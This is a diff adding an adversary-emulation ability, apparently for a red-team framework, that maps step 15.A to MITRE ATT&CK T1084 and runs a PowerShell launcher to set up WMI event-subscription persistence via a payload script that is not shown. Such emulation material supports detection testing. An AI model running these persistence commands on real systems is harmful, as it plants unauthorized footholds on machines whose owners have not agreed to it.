@@ -1,0 +1,27 @@
+---
+
+- id: 43aad2d6-d16a-4adb-aa2b-9510a3be4c52
+  name: 15.A - WMI Persistence technique
+  description: user triage
+  tactic: persistence
+  technique:
+    attack_id: T1084
+    name: Windows Management Instrumentation Event Subscription
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Get-WmiObject -Namespace "root/subscription" -list | findstr /i "__Filter";
+          if ($?) {
+            write-host "[*] WMI script has already executed on this machine. Not loading and executing wmi script.";
+            exit 1;
+          } else {
+            . .\stepFifteen_wmi.ps1;
+            wmi;
+            if ($?) {
+              write-host "[+] WMI script has successfully executed!";
+              exit 0;
+            }
+            exit 1;
+          }
+        payload: stepFifteen_wmi.ps1
